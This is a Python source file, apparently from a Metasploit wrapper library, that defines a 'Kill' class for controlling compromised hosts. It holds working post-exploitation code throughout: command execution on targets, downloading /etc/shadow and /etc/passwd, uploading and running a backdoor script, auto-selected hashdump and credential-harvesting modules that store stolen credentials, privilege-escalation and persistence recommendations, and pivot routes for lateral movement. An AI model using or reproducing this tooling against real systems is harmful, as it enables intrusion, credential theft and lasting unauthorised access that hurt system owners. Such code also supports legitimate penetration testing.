"""Kill module - a confirmed hit (active session on compromised target).

The Kill class wraps msf.Session with themed methods for post-exploitation
operations, smart profiling, and context-aware harvesting.

Example:
    >>> kill = contract.execute()
    >>> if kill:
    ...     print(f"Target eliminated: {kill}")
    ...     print(kill.interrogate("whoami"))
    ...
    ...     # Smart profiling
    ...     profile = kill.profile()
    ...     print(f"Running as: {profile.user} (privileged: {profile.is_privileged})")
    ...
    ...     # Context-aware recommendations
    ...     for rec in kill.recommend_actions():
    ...         print(f"[{rec.priority}] {rec.title}")
    ...
    ...     # Auto-harvest based on profile
    ...     result = kill.harvest(auto=True)
    ...     print(f"Found {len(result.loot)} items, stored {result.creds_stored} creds")
    ...
    ...     kill.silence()  # Clean up
"""

from __future__ import annotations

import os
from typing import TYPE_CHECKING, Any, Dict, List, Optional

from assassinate.console import print_kill
from assassinate.log_config import get_logger
from assassinate.profile import (
    HarvestResult,
    LootItem,
    Recommendation,
    TargetProfile,
    HARVEST_MODULES,
    PRIVESC_MODULES,
    PERSISTENCE_MODULES,
)

if TYPE_CHECKING:
    import msf
    from assassinate.target import Target

logger = get_logger("kill")


class Kill:
    """A confirmed kill (active session on compromised target).

    Wraps msf.Session with themed methods for interrogation (commands),
    extraction (file download), implantation (file upload), and silencing
    (session termination).

    Attributes:
        target: The Target that was compromised
        id: Session ID
        type: Session type (shell, meterpreter)
        confirmed: Whether the session is still alive

    Example:
        >>> kill = contract.execute()
        >>> if kill:
        ...     whoami = kill.interrogate("whoami")
        ...     print(f"Compromised as: {whoami}")
        ...
        ...     # Extract sensitive files
        ...     kill.extract("/etc/shadow", "loot/shadow.txt")
        ...
        ...     # Clean up
        ...     kill.silence()
    """

    __slots__ = ("_session", "target", "_via_weapon", "_via_payload", "_profile")

    def __init__(
        self,
        session: "msf.Session",
        target: Optional["Target"] = None,
        via_weapon: Optional[str] = None,
        via_payload: Optional[str] = None,
    ):
        """Initialize a Kill from an MSF session.

        Args:
            session: The underlying msf.Session
            target: The Target that was compromised (optional)
            via_weapon: Weapon used for the kill (optional)
            via_payload: Payload used for the kill (optional)
        """
        self._session = session
        self.target = target
        self._via_weapon = via_weapon
        self._via_payload = via_payload
        self._profile: Optional[TargetProfile] = None
        logger.success(
            f"Kill confirmed: session {session.sid} @ {session.host}:{session.port} via {via_weapon or 'unknown'}"
        )

    # =========================================================================
    # Identity
    # =========================================================================

    @property
    def id(self) -> int:
        """Session ID."""
        return self._session.sid

    @property
    def type(self) -> str:
        """Session type (shell, meterpreter)."""
        return self._session.session_type

    @property
    def confirmed(self) -> bool:
        """Whether the session is still alive."""
        try:
            return self._session.alive
        except Exception as e:
            logger.debug(f"Session alive check failed: {e}")
            return False

    @property
    def is_meterpreter(self) -> bool:
        """Whether this is a meterpreter session."""
        return "meterpreter" in self.type.lower()

    @property
    def is_shell(self) -> bool:
        """Whether this is a basic shell session."""
        return "shell" in self.type.lower()

    # =========================================================================
    # Target Info
    # =========================================================================

    @property
    def host(self) -> str:
        """Target host IP address."""
        return self._session.host

    @property
    def port(self) -> int:
        """Target port."""
        return self._session.port

    @property
    def via_exploit(self) -> str:
        """Exploit that created this session."""
        return self._via_weapon or self._session.via_exploit

    @property
    def via_payload(self) -> str:
        """Payload used for this session."""
        return self._via_payload or self._session.via_payload

    @property
    def info(self) -> str:
        """Session info string."""
        return self._session.info

    # =========================================================================
    # Interrogation (Command Execution)
    # =========================================================================

    def interrogate(self, cmd: str, timeout: Optional[int] = None) -> str:
        """Execute a command and return the output.

        The primary method for interacting with a compromised target.
        Sends a command and waits for output.

        Args:
            cmd: Command to execute
            timeout: Optional timeout in seconds

        Returns:
            Command output as string

        Example:
            >>> whoami = kill.interrogate("whoami")
            >>> print(f"Running as: {whoami.strip()}")

            >>> passwd = kill.interrogate("cat /etc/passwd")
            >>> for line in passwd.splitlines():
            ...     print(line)
        """
        logger.debug(f"Interrogating kill {self.id}: {cmd[:50] + '...' if len(cmd) > 50 else cmd}")
        try:
            result = self._session.run_cmd(cmd, timeout)
            logger.debug(f"Interrogation returned {len(result)} chars")
            return result
        except Exception as e:
            logger.error(f"Interrogation failed on kill {self.id}: {e}")
            raise

    def read(self, length: Optional[int] = None) -> str:
        """Read available data from the session buffer.

        Args:
            length: Maximum bytes to read (None for all available)

        Returns:
            Available data as string
        """
        return self._session.read(length)

    def write(self, data: str) -> int:
        """Write raw data to the session.

        Args:
            data: Data to write

        Returns:
            Number of bytes written
        """
        return self._session.write(data)

    # =========================================================================
    # File Operations
    # =========================================================================

    def extract(
        self,
        remote_path: str,
        local_path: Optional[str] = None,
    ) -> str:
        """Download a file from the target.

        Args:
            remote_path: Path on the target system
            local_path: Local destination (default: use filename in current dir)

        Returns:
            Local path where file was saved

        Example:
            >>> # Extract to current directory
            >>> kill.extract("/etc/passwd")

            >>> # Extract to specific location
            >>> kill.extract("/etc/shadow", "/tmp/loot/shadow.txt")
        """
        if local_path is None:
            local_path = os.path.basename(remote_path)

        logger.info(f"Extracting {remote_path} from kill {self.id} to {local_path}")

        # Ensure local directory exists
        local_dir = os.path.dirname(local_path)
        if local_dir:
            os.makedirs(local_dir, exist_ok=True)

        try:
            if self.is_meterpreter:
                # Use meterpreter download
                logger.debug("Using meterpreter download")
                self._session._rust.fs_download(remote_path, local_path)
            else:
                # For shell sessions, use cat and write locally
                logger.debug("Using shell cat method")
                content = self.interrogate(f"cat {remote_path}")
                with open(local_path, "w") as f:
                    f.write(content)

            logger.success(f"Extraction complete: {local_path}")
            return local_path
        except Exception as e:
            logger.error(f"Extraction failed: {e}")
            raise

    def implant(self, local_path: str, remote_path: str) -> bool:
        """Upload a file to the target.

        Args:
            local_path: Path to local file
            remote_path: Destination path on target

        Returns:
            True if successful

        Example:
            >>> kill.implant("backdoor.sh", "/tmp/backdoor.sh")
            >>> kill.interrogate("chmod +x /tmp/backdoor.sh && /tmp/backdoor.sh")
        """
        logger.info(f"Implanting {local_path} to kill {self.id} as {remote_path}")

        try:
            if self.is_meterpreter:
                # Use meterpreter upload
                logger.debug("Using meterpreter upload")
                self._session._rust.fs_upload(local_path, remote_path)
            else:
                # For shell sessions, base64 encode and decode on target
                logger.debug("Using shell base64 method")
                import base64
                with open(local_path, "rb") as f:
                    content = base64.b64encode(f.read()).decode()

                # Upload using echo and base64 decode
                self.interrogate(f"echo '{content}' | base64 -d > {remote_path}")

            logger.success(f"Implant complete: {remote_path}")
            return True
        except Exception as e:
            logger.error(f"Implant failed: {e}")
            raise

    # =========================================================================
    # Session Control
    # =========================================================================

    def silence(self) -> None:
        """Kill this session (clean up).

        Terminates the session, removing the connection to the target.
        Use when you're done with the compromised system.

        Example:
            >>> # Always clean up when done
            >>> try:
            ...     kill.interrogate("whoami")
            ... finally:
            ...     kill.silence()
        """
        logger.info(f"Silencing kill {self.id} @ {self.host}")
        try:
            self._session.kill()
            logger.info(f"Kill {self.id} silenced")
        except Exception as e:
            logger.warning(f"Failed to silence kill {self.id}: {e}")

    # =========================================================================
    # Intelligence Layer - Profiling, Harvesting, Recommendations
    # =========================================================================

    def profile(self, cache: bool = True) -> TargetProfile:
        """Profile the compromised target to gather system information.

        Collects OS, user, privileges, network interfaces, and routes
        using meterpreter session methods. The profile is cached by default.

        Args:
            cache: Use cached profile if available (default True)

        Returns:
            TargetProfile with system information

        Raises:
            RuntimeError: If called on a non-meterpreter session

        Example:
            >>> profile = kill.profile()
            >>> print(f"OS: {profile.os_name}")
            >>> print(f"User: {profile.user}")
            >>> print(f"Privileged: {profile.is_privileged}")
            >>> for net in profile.internal_networks:
            ...     print(f"Internal network: {net}")
        """
        if cache and self._profile is not None:
            logger.debug("Returning cached profile")
            return self._profile

        if not self.is_meterpreter:
            raise RuntimeError(
                "profile() requires a meterpreter session. "
                "Use shell_to_meterpreter() to upgrade, or gather info manually."
            )

        logger.info(f"Profiling target via session {self.id}")

        # Gather system info
        try:
            sysinfo = self._session._rust.sys_sysinfo()
        except Exception as e:
            logger.warning(f"Failed to get sysinfo: {e}")
            sysinfo = {}

        try:
            user = self._session._rust.sys_getuid()
        except Exception as e:
            logger.warning(f"Failed to get user: {e}")
            user = ""

        # Parse OS info
        os_str = sysinfo.get("OS", "")
        os_name = "Unknown"
        if "windows" in os_str.lower():
            os_name = "Windows"
        elif "linux" in os_str.lower():
            os_name = "Linux"
        elif "darwin" in os_str.lower() or "macos" in os_str.lower():
            os_name = "macOS"

        # Get architecture
        try:
            arch = self._session._rust.meterpreter_native_arch()
        except Exception:
            arch = sysinfo.get("Architecture", "")

        # Get privileges (Windows-specific)
        is_system = False
        privileges: List[str] = []
        if os_name == "Windows":
            try:
                is_system = self._session._rust.sys_is_system()
            except Exception:
                pass
            try:
                privileges = self._session._rust.sys_getprivs()
            except Exception:
                pass

        # Parse UID for Unix
        uid: Optional[int] = None
        if os_name != "Windows" and user:
            # Try to extract UID from user string like "uid=0(root)"
            import re
            match = re.search(r"uid=(\d+)", user)
            if match:
                uid = int(match.group(1))
            elif "root" in user.lower():
                uid = 0

        # Get network interfaces
        interfaces: List[Dict[str, Any]] = []
        try:
            interfaces = self._session._rust.net_get_interfaces()
        except Exception as e:
            logger.warning(f"Failed to get interfaces: {e}")

        # Get routes
        routes: List[Dict[str, Any]] = []
        try:
            routes = self._session._rust.net_get_routes()
        except Exception as e:
            logger.warning(f"Failed to get routes: {e}")

        # Discover internal networks from interfaces
        internal_networks: List[str] = []
        for iface in interfaces:
            ip = iface.get("ip", "")
            if ip and not ip.startswith("127.") and not ip.startswith("::"):
                # Simple /24 subnet extraction
                parts = ip.rsplit(".", 1)
                if len(parts) == 2:
                    subnet = f"{parts[0]}.0/24"
                    if subnet not in internal_networks:
                        internal_networks.append(subnet)

        # Get domain info (Windows)
        domain = sysinfo.get("Domain", "")

        # Convert lists to tuples for frozen dataclass
        self._profile = TargetProfile(
            os=os_str,
            os_name=os_name,
            computer=sysinfo.get("Computer", ""),
            architecture=arch,
            user=user,
            uid=uid,
            privileges=tuple(privileges),
            is_system=is_system,
            interfaces=tuple(
                tuple(sorted(iface.items())) if isinstance(iface, dict) else iface
                for iface in interfaces
            ),
            routes=tuple(
                tuple(sorted(route.items())) if isinstance(route, dict) else route
                for route in routes
            ),
            internal_networks=tuple(internal_networks),
            domain=domain,
        )

        logger.info(f"Profile complete: {self._profile}")
        return self._profile

    def harvest(
        self,
        modules: Optional[List[str]] = None,
        auto: bool = False,
    ) -> HarvestResult:
        """Run post-exploitation modules and collect loot.

        Can run specific modules or auto-select based on the target profile.
        Credentials are automatically stored in the MSF database if available.

        Args:
            modules: Specific post modules to run (optional)
            auto: Auto-select modules based on target profile

        Returns:
            HarvestResult with profile, loot, and statistics

        Example:
            >>> # Auto-select modules based on profile
            >>> result = kill.harvest(auto=True)
            >>> for item in result.loot:
            ...     print(f"{item.type}: {item.data}")

            >>> # Run specific modules
            >>> result = kill.harvest(modules=[
            ...     "post/multi/gather/env",
            ...     "post/linux/gather/hashdump"
            ... ])
        """
        import msf

        logger.info(f"Harvesting from session {self.id}")

        # Get profile (needed for auto-selection and result)
        try:
            target_profile = self.profile()
        except RuntimeError:
            # Non-meterpreter session - create minimal profile
            target_profile = TargetProfile(
                os="Unknown",
                os_name="Unknown",
                user="",
            )

        # Auto-select modules if requested
        if auto and not modules:
            modules = self._select_harvest_modules(target_profile)
            logger.debug(f"Auto-selected {len(modules)} harvest modules")

        if not modules:
            logger.warning("No modules specified and auto=False")
            return HarvestResult(profile=target_profile)

        # Run modules and collect loot
        loot: List[LootItem] = []
        modules_run: List[str] = []
        errors: List[str] = []

        for mod_name in modules:
            logger.debug(f"Running harvest module: {mod_name}")
            try:
                result = self._session.run_post_module(mod_name, {})
                modules_run.append(mod_name)

                # Parse loot from module output (module-specific)
                parsed_loot = self._parse_module_loot(mod_name, result)
                loot.extend(parsed_loot)

            except Exception as e:
                error_msg = f"{mod_name}: {e}"
                errors.append(error_msg)
                logger.warning(f"Harvest module failed: {error_msg}")

        # Store credentials in database
        creds_stored = 0
        if msf.db_active():
            for item in loot:
                if item.type == "credential":
                    try:
                        msf.db_report_cred({
                            "host": item.host,
                            "user": item.data.get("user", ""),
                            "pass": item.data.get("password", ""),
                            "type": item.data.get("type", "password"),
                        })
                        creds_stored += 1
                    except Exception as e:
                        logger.warning(f"Failed to store credential: {e}")

        result = HarvestResult(
            profile=target_profile,
            loot=loot,
            creds_stored=creds_stored,
            modules_run=modules_run,
            errors=errors,
        )

        logger.info(
            f"Harvest complete: {len(loot)} items, {creds_stored} creds stored, "
            f"{len(errors)} errors"
        )
        return result

    def _select_harvest_modules(self, target_profile: TargetProfile) -> List[str]:
        """Auto-select harvest modules based on target profile.

        Args:
            target_profile: Target system profile

        Returns:
            List of appropriate post module names
        """
        modules: List[str] = []

        # Determine platform key
        if target_profile.is_windows:
            platform = "windows"
        elif target_profile.is_macos:
            platform = "macos"
        else:
            platform = "linux"

        # Determine privilege level
        if target_profile.is_privileged:
            if target_profile.is_windows:
                priv_level = "system" if target_profile.is_system else "admin"
            else:
                priv_level = "root"
        else:
            priv_level = "user"

        # Get modules for this platform and privilege level
        platform_modules = HARVEST_MODULES.get(platform, {})
        modules = platform_modules.get(priv_level, []).copy()

        # Add user-level modules if we're privileged (we can do everything)
        if priv_level != "user":
            user_modules = platform_modules.get("user", [])
            for mod in user_modules:
                if mod not in modules:
                    modules.append(mod)

        logger.debug(
            f"Selected {len(modules)} modules for {platform}/{priv_level}"
        )
        return modules

    def _parse_module_loot(
        self, module_name: str, result: Any
    ) -> List[LootItem]:
        """Parse loot from a post module's output.

        This is a simplified parser - in practice, different modules
        return data in different formats.

        Args:
            module_name: Name of the module that ran
            result: Module execution result

        Returns:
            List of parsed LootItem objects
        """
        loot: List[LootItem] = []

        # Module ran successfully but we don't have structured output yet
        # In a full implementation, this would parse MSF's loot/cred tables
        # For now, we note that the module ran
        logger.debug(f"Module {module_name} completed, result: {result}")

        # Heuristic parsing based on module type
        if "hashdump" in module_name.lower():
            loot.append(LootItem(
                type="hash",
                source_module=module_name,
                data={"note": "Hashes captured - check MSF loot"},
                host=self.host,
            ))
        elif "cred" in module_name.lower():
            loot.append(LootItem(
                type="credential",
                source_module=module_name,
                data={"note": "Credentials gathered - check MSF creds"},
                host=self.host,
            ))
        elif "env" in module_name.lower():
            loot.append(LootItem(
                type="info",
                source_module=module_name,
                data={"note": "Environment info gathered"},
                host=self.host,
            ))

        return loot

    def recommend_actions(self) -> List[Recommendation]:
        """Generate context-aware recommendations for next steps.

        Based on the target profile, suggests appropriate actions like
        privilege escalation, persistence, lateral movement, or harvesting.

        Returns:
            List of Recommendation objects sorted by priority

        Example:
            >>> for rec in kill.recommend_actions():
            ...     print(f"[{rec.priority}] {rec.title}: {rec.description}")
            ...     if rec.module:
            ...         print(f"    Suggested module: {rec.module}")
        """
        logger.debug("Generating action recommendations")
        recommendations: List[Recommendation] = []

        try:
            target_profile = self.profile()
        except RuntimeError:
            # Non-meterpreter session
            recommendations.append(Recommendation(
                category="upgrade",
                priority=1,
                title="Upgrade to Meterpreter",
                description="Shell session has limited capabilities. Upgrade for full post-exploitation.",
                module=None,
            ))
            return recommendations

        # Privilege escalation recommendations
        if not target_profile.is_privileged:
            recommendations.append(Recommendation(
                category="privesc",
                priority=1,
                title="Privilege Escalation Required",
                description=f"Running as {target_profile.user}, not privileged. Escalation needed for full access.",
                module="post/multi/recon/local_exploit_suggester",
            ))

            # Platform-specific privesc modules
            if target_profile.is_windows:
                recommendations.append(Recommendation(
                    category="privesc",
                    priority=2,
                    title="Enumerate Missing Patches",
                    description="Check for missing Windows patches that may allow privilege escalation.",
                    module="post/windows/gather/enum_patches",
                ))
            else:
                recommendations.append(Recommendation(
                    category="privesc",
                    priority=2,
                    title="Check Security Protections",
                    description="Enumerate security protections that may affect exploitation.",
                    module="post/linux/gather/enum_protections",
                ))

        # Harvesting recommendations
        if target_profile.is_privileged:
            recommendations.append(Recommendation(
                category="harvest",
                priority=2,
                title="Harvest Credentials",
                description="Privileged access allows credential dumping.",
                module="post/windows/gather/hashdump" if target_profile.is_windows else "post/linux/gather/hashdump",
            ))

        # Pivot recommendations based on discovered networks
        for net in target_profile.internal_networks:
            # Skip if it's likely the same network we're on
            if self.host.rsplit(".", 1)[0] + ".0/24" == net:
                continue

            recommendations.append(Recommendation(
                category="pivot",
                priority=3,
                title=f"Pivot to {net}",
                description=f"Internal network {net} discovered via {target_profile.computer}. Consider lateral movement.",
                module=None,
            ))

        # Persistence recommendations (lower priority)
        if target_profile.is_privileged:
            recommendations.append(Recommendation(
                category="persist",
                priority=4,
                title="Establish Persistence",
                description="Consider installing persistence mechanism for continued access.",
                module=PERSISTENCE_MODULES.get(
                    "windows" if target_profile.is_windows else "linux", [""]
                )[0] or None,
            ))

        # Sort by priority
        recommendations.sort()

        logger.debug(f"Generated {len(recommendations)} recommendations")
        return recommendations

    def pivot(self, subnet: str, netmask: str = "255.255.255.0") -> bool:
        """Add a pivot route through this session.

        Enables MSF routing so traffic destined for the subnet flows
        through this session's meterpreter.

        Args:
            subnet: Destination subnet (e.g., "10.0.0.0")
            netmask: Subnet mask (default "255.255.255.0")

        Returns:
            True if route was added successfully

        Example:
            >>> # Discovered internal network via profile
            >>> profile = kill.profile()
            >>> for net in profile.internal_networks:
            ...     subnet = net.split("/")[0]  # "10.0.0.0/24" -> "10.0.0.0"
            ...     kill.pivot(subnet)
        """
        import msf

        if not self.is_meterpreter:
            logger.warning("Pivoting requires a meterpreter session")
            return False

        logger.info(f"Adding pivot route: {subnet}/{netmask} via session {self.id}")

        try:
            result = msf.route_add(subnet, netmask, self.id)
            if result:
                logger.success(f"Pivot route added: {subnet}/{netmask}")
            else:
                logger.warning(f"Failed to add pivot route")
            return result
        except Exception as e:
            logger.error(f"Error adding pivot route: {e}")
            return False

    # =========================================================================
    # Advanced Features (Still Placeholders)
    # =========================================================================

    def escalate(self) -> Optional["Kill"]:
        """Attempt privilege escalation (future feature).

        Returns:
            New Kill with elevated privileges, or None

        Note:
            Use recommend_actions() to find escalation paths,
            then execute manually.
        """
        raise NotImplementedError(
            "Automatic privilege escalation is not yet implemented. "
            "Use recommend_actions() to find escalation paths, then run modules manually."
        )

    def persist(self) -> bool:
        """Install persistence mechanism (future feature).

        Returns:
            True if persistence installed

        Note:
            Use recommend_actions() to find persistence options.
        """
        raise NotImplementedError(
            "Automatic persistence is not yet implemented. "
            "Use recommend_actions() to find persistence modules, then run manually."
        )

    # =========================================================================
    # Raw Access
    # =========================================================================

    @property
    def session(self) -> "msf.Session":
        """Access underlying msf.Session for advanced operations.

        Use this when you need access to methods not exposed through Kill.

        Example:
            >>> # Access meterpreter-specific methods
            >>> if kill.is_meterpreter:
            ...     kill.session._rust.fs_pwd()
        """
        return self._session

    # =========================================================================
    # Display
    # =========================================================================

    def summary(self, full: bool = False) -> str:
        """Get a detailed multi-line summary of this kill.

        Args:
            full: If True, show all vulnerabilities without truncation.

        Returns:
            Formatted string with full kill details

        Example:
            >>> print(kill.summary())
            >>> kill.p(full=True)  # Show all vulns
        """
        status = "✓ CONFIRMED" if self.confirmed else "✗ LOST"
        lines = [
            f"{'═' * 60}",
            f"  Kill #{self.id} - {self.type.upper()}",
            f"{'═' * 60}",
            f"",
            f"  Status: {status}",
            f"  Target: {self.host}:{self.port}",
        ]

        if self.via_exploit:
            lines.append(f"")
            lines.append(f"  Attack Vector:")
            lines.append(f"    Exploit: {self.via_exploit}")
        if self.via_payload:
            lines.append(f"    Payload: {self.via_payload}")

        if self.target and self.target.vulns:
            lines.append(f"")
            lines.append(f"  Known Vulnerabilities:")
            vuln_limit = None if full else 5
            for vuln in self.target.vulns[:vuln_limit]:
                lines.append(f"    • {vuln}")
            if not full and len(self.target.vulns) > 5:
                lines.append(f"    ... and {len(self.target.vulns) - 5} more")

        # Add session info if meterpreter
        if self.is_meterpreter and self.confirmed:
            lines.append(f"")
            lines.append(f"  Meterpreter Info:")
            try:
                uid = self._session._rust.sys_getuid()
                lines.append(f"    User: {uid}")
            except Exception:
                pass
            try:
                sysinfo = self._session._rust.sys_sysinfo()
                if sysinfo.get("Computer"):
                    lines.append(f"    Computer: {sysinfo.get('Computer')}")
                if sysinfo.get("OS"):
                    lines.append(f"    OS: {sysinfo.get('OS')}")
            except Exception:
                pass

        lines.append(f"{'─' * 60}")
        return "\n".join(lines)

    def p(self, full: bool = False) -> None:
        """Print rich formatted summary.

        Args:
            full: If True, show all vulnerabilities without truncation.
        """
        # Gather meterpreter info if available
        meterpreter_info = None
        if self.is_meterpreter and self.confirmed:
            meterpreter_info = {}
            try:
                meterpreter_info["user"] = self._session._rust.sys_getuid()
            except Exception:
                pass
            try:
                sysinfo = self._session._rust.sys_sysinfo()
                meterpreter_info["computer"] = sysinfo.get("Computer")
                meterpreter_info["os"] = sysinfo.get("OS")
            except Exception:
                pass

        print_kill(
            kill_id=self.id,
            kill_type=self.type,
            host=self.host,
            port=self.port,
            confirmed=self.confirmed,
            via_exploit=self.via_exploit,
            via_payload=self.via_payload,
            vulns=self.target.vulns if self.target else None,
            meterpreter_info=meterpreter_info if meterpreter_info else None,
            full=full,
        )

    def __repr__(self) -> str:
        status = "confirmed" if self.confirmed else "lost"
        parts = [f"<Kill #{self.id}: {self.type} @ {self.host}:{self.port}"]
        if self.via_exploit:
            exploit_name = self.via_exploit.split('/')[-1] if '/' in self.via_exploit else self.via_exploit
            parts.append(f"via={exploit_name}")
        parts.append(f"[{status}]")
        return " ".join(parts) + ">"

    def __str__(self) -> str:
        return f"Kill #{self.id} ({self.type} @ {self.host})"

    def __bool__(self) -> bool:
        """Kill is truthy if session is confirmed (alive)."""
        return self.confirmed

    def __eq__(self, other: object) -> bool:
        if isinstance(other, Kill):
            return self.id == other.id
        if isinstance(other, int):
            return self.id == other
        return False

    def __hash__(self) -> int:
        return hash(self.id)
